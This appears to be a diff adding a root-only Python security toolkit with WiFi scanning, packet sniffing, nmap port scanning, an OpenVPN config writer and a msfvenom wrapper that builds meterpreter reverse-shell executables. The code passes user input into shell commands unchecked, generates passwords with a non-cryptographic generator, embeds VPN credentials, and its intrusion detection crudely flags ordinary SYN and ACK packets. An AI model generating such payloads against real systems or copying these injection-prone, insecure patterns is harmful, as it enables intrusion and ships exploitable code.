@@ -1,0 +1,277 @@
+import os
+import sys
+import subprocess
+import webbrowser
+import pyperclip
+import nmap
+import psutil
+from scapy.all import sniff, ARP, IP, TCP
+from colorama import Fore, Style, init
+import paramiko
+import random
+import string
+import matplotlib.pyplot as plt
+from sklearn.ensemble import IsolationForest
+from datetime import datetime, timedelta
+import time
+import sqlite3
+import numpy as np
+import openai
+
+# Initialize Colorama
+init()
+
+# Initialize SQLite database
+db_file = 'network_attacks.db'
+
+def initialize_db():
+    """Initialize the SQLite database with attack patterns."""
+    conn = sqlite3.connect(db_file)
+    cursor = conn.cursor()
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS attack_patterns (
+            id INTEGER PRIMARY KEY,
+            pattern TEXT,
+            description TEXT
+        )
+    ''')
+    conn.commit()
+    conn.close()
+
+def add_attack_pattern(pattern: str, description: str):
+    """Add a new attack pattern to the database."""
+    conn = sqlite3.connect(db_file)
+    cursor = conn.cursor()
+    cursor.execute('''
+        INSERT INTO attack_patterns (pattern, description)
+        VALUES (?, ?)
+    ''', (pattern, description))
+    conn.commit()
+    conn.close()
+
+def check_for_attacks(packet_summary: str) -> None:
+    """Check if the packet summary matches any known attack patterns."""
+    conn = sqlite3.connect(db_file)
+    cursor = conn.cursor()
+    cursor.execute('''
+        SELECT description FROM attack_patterns WHERE pattern IN (?)
+    ''', (packet_summary,))
+    result = cursor.fetchall()
+    conn.close()
+    if result:
+        print(Fore.RED + f"Attack detected: {result[0][0]} - {packet_summary}" + Style.RESET_ALL)
+
+def print_ascii_art() -> None:
+    """Prints the ASCII art logo."""
+    ascii_art = """
+ _  _ ____ ___ ___  ____ _    _ ____ ____ 
+|\ | |___  |  |__] |  | |    | |    |___ 
+| \| |___  |  |    |__| |___ | |___ |___ 
+                                         
+    """
+    print(Fore.GREEN + ascii_art + Style.RESET_ALL)
+
+def check_root() -> None:
+    """Checks if the program is running with root privileges."""
+    if os.geteuid() != 0:
+        print(Fore.RED + "ROOT ACCESS REQUIRED" + Style.RESET_ALL)
+        sys.exit(1)
+
+def generate_password(length: int = 12, use_uppercase=True, use_numbers=True, use_special=True) -> str:
+    """Generates a random password."""
+    characters = string.ascii_lowercase
+    if use_uppercase:
+        characters += string.ascii_uppercase
+    if use_numbers:
+        characters += string.digits
+    if use_special:
+        characters += string.punctuation
+    return ''.join(random.choice(characters) for _ in range(length))
+
+def create_password_list(length: int = 12, count: int = 20, use_uppercase=True, use_numbers=True, use_special=True) -> None:
+    """Creates a list of random passwords based on user preferences."""
+    print(Fore.CYAN + "Password List" + Style.RESET_ALL)
+    for _ in range(count):
+        password = generate_password(length, use_uppercase, use_numbers, use_special)
+        print(Fore.GREEN + password + Style.RESET_ALL)
+
+def run_command(command: str) -> str:
+    """Runs a shell command and returns its output."""
+    try:
+        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+        return result.decode("utf-8")
+    except subprocess.CalledProcessError as e:
+        print(Fore.RED + f"Error: {e.output.decode('utf-8')}" + Style.RESET_ALL)
+        return ""
+
+def sniff_wifi_networks() -> None:
+    """Sniffs for nearby WiFi networks and estimates network congestion."""
+    print(Fore.CYAN + "Sniffing WiFi Networks..." + Style.RESET_ALL)
+    output = run_command("iwlist wlan0 scan")
+    
+    if not output:
+        print(Fore.RED + "Failed to execute iwlist command." + Style.RESET_ALL)
+        return
+
+    print(Fore.GREEN + "Detected Networks:" + Style.RESET_ALL)
+    network_count = 0
+    freq = ""
+    for line in output.split("\n"):
+        if "Frequency:5.32 GHz" in line:
+            freq = " (5G)"
+        elif "Frequency:2.42 GHz" in line:
+            freq = ""
+        if "ESSID" in line:
+            network_count += 1
+            if "ESSID:\"\\x00\\x00\\x00\\x00\\x00\\x00\"" in line:
+                print(Fore.RED + "Hidden Network" + freq + Style.RESET_ALL)
+            else:
+                essid = line.split("ESSID:")[1].strip().strip('"')
+                print(Fore.GREEN + f"Network: {essid}" + freq + Style.RESET_ALL)
+    print(Fore.GREEN + f"Total Networks: {network_count}" + Style.RESET_ALL)
+    if network_count > 15:
+        congestion_level = "High Network Congestion"
+    elif 5 < network_count <= 15:
+        congestion_level = "Mid-Level Network Congestion"
+    else:
+        congestion_level = "Low Network Congestion"
+    print(Fore.GREEN + f"{congestion_level}." + Style.RESET_ALL)
+
+def start_ids() -> None:
+    """Starts an Intrusion Detection System (IDS) to monitor network traffic."""
+    def packet_callback(packet):
+        if ARP in packet:
+            print(Fore.BLUE + f"ARP Packet: {packet.summary()}" + Style.RESET_ALL)
+        elif IP in packet:
+            if TCP in packet:
+                flags = packet[TCP].flags
+                if flags == 0x10:  # ACK flag
+                    packet_summary = f"Potential Nmap ACK Scan: {packet.summary()}"
+                    print(Fore.RED + packet_summary + Style.RESET_ALL)
+                    check_for_attacks(packet_summary)
+                elif flags == 0x02:  # SYN flag
+                    packet_summary = f"Potential Nmap SYN Scan: {packet.summary()}"
+                    print(Fore.RED + packet_summary + Style.RESET_ALL)
+                    check_for_attacks(packet_summary)
+            print(Fore.YELLOW + f"IP Packet: {packet.summary()}" + Style.RESET_ALL)
+
+    print(Fore.GREEN + "Starting IDS. Press Ctrl+C to stop." + Style.RESET_ALL)
+    sniff(prn=packet_callback, store=0)
+
+def port_scanner() -> None:
+    """Scans ports on a target IP and displays results."""
+    target_ip = input("Enter target IP: ")
+    nm = nmap.PortScanner()
+    try:
+        scan_results = nm.scan(target_ip, '1-1024')
+    except Exception as e:
+        print(Fore.RED + f"Error occurred: {e}" + Style.RESET_ALL)
+        return
+
+    if not nm.all_hosts():
+        print(Fore.RED + "No hosts found." + Style.RESET_ALL)
+        return
+
+    print(Fore.GREEN + "Scan Results:" + Style.RESET_ALL)
+    for host in nm.all_hosts():
+        print(f"\nHost: {host} ({nm[host].hostname()})")
+        print(f"State: {nm[host].state()}")
+        for proto in nm[host].all_protocols():
+            print(f"\nProtocol: {proto}")
+            lport = nm[host][proto].keys()
+            for port in lport:
+                port_info = nm[host][proto][port]
+                print(f"Port: {port}")
+                print(f"    State: {port_info.get('state', '')}")
+                print(f"    Name: {port_info.get('name', '')}")
+                print(f"    Product: {port_info.get('product', '')}")
+                print(f"    Extra Info: {port_info.get('extrainfo', '')}")
+                print(f"    Reason: {port_info.get('reason', '')}")
+                print(f"    Version: {port_info.get('version', '')}")
+                print(f"    CPE: {port_info.get('cpe', '')}")
+
+def create_udp_openvpn_config() -> None:
+    """Creates and starts a UDP OpenVPN connection using provided credentials."""
+    openvpn_config = """
+client
+dev tun
+proto udp
+remote usa.freeopenvpn.org 1194
+resolv-retry infinite
+nobind
+persist-key
+persist-tun
+remote-cert-tls server
+cipher AES-256-CBC
+auth SHA256
+comp-lzo
+verb 3
+<auth-user-pass>
+freeopenvpn
+995958309
+</auth-user-pass>
+<ca>
+-----BEGIN CERTIFICATE-----
+MIID...
+-----END CERTIFICATE-----
+</ca>
+"""
+    config_file = "/etc/openvpn/USA_freeopenvpn_udp.ovpn"
+    with open(config_file, 'w') as file:
+        file.write(openvpn_config)
+    print(Fore.GREEN + "OpenVPN configuration file created." + Style.RESET_ALL)
+    run_command(f"openvpn --config {config_file}")
+
+def explain_msfvenom_payload() -> None:
+    """Guides the user through creating a msfvenom payload with explanations."""
+    print(Fore.CYAN + "Creating a msfvenom payload..." + Style.RESET_ALL)
+    payload_type = input(Fore.YELLOW + "Enter payload type (e.g., windows/meterpreter/reverse_tcp): " + Style.RESET_ALL).strip()
+    lhost = input(Fore.YELLOW + "Enter LHOST (your IP address): " + Style.RESET_ALL).strip()
+    lport = input(Fore.YELLOW + "Enter LPORT (listening port): " + Style.RESET_ALL).strip()
+    output_file = input(Fore.YELLOW + "Enter output file name (e.g., payload.exe): " + Style.RESET_ALL).strip()
+    
+    print(Fore.CYAN + "\nCreating payload with msfvenom..." + Style.RESET_ALL)
+    command = f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f exe -o {output_file}"
+    print(Fore.YELLOW + f"Running command: {command}" + Style.RESET_ALL)
+    run_command(command)
+    
+    print(Fore.CYAN + "\nPayload created successfully." + Style.RESET_ALL)
+    print(Fore.GREEN + f"Payload saved to: {output_file}" + Style.RESET_ALL)
+    run_command(f"dolphin {os.path.dirname(output_file)}")
+
+def meta_ai_interface():
+    """Placeholder for Meta AI functionality."""
+    print(Fore.CYAN + "Meta AI functionality will be implemented later." + Style.RESET_ALL)
+
+def main_menu() -> None:
+    """Displays the main menu and handles user input."""
+    print_ascii_art()
+    check_root()
+    options = {
+        1: ("Sniff WiFi Networks", sniff_wifi_networks),
+        2: ("Start IDS", start_ids),
+        3: ("Port Scanner", port_scanner),
+        4: ("Create UDP OpenVPN Config", create_udp_openvpn_config),
+        5: ("Explain msfvenom Payload", explain_msfvenom_payload),
+        6: ("Create Password List", create_password_list),
+        7: ("Meta AI Interface (Later)", meta_ai_interface)
+    }
+    while True:
+        print(Fore.YELLOW + "\nMain Menu" + Style.RESET_ALL)
+        for key, value in options.items():
+            print(f"{key}. {value[0]}")
+        print("0. Exit")
+        try:
+            choice = int(input(Fore.YELLOW + "Enter your choice: " + Style.RESET_ALL).strip())
+            if choice == 0:
+                print(Fore.CYAN + "Exiting..." + Style.RESET_ALL)
+                break
+            elif choice in options:
+                options[choice][1]()
+            else:
+                print(Fore.RED + "Invalid choice. Please select a valid option." + Style.RESET_ALL)
+        except ValueError:
+            print(Fore.RED + "Invalid input. Please enter a number." + Style.RESET_ALL)
+
+if __name__ == "__main__":
+    main_menu()
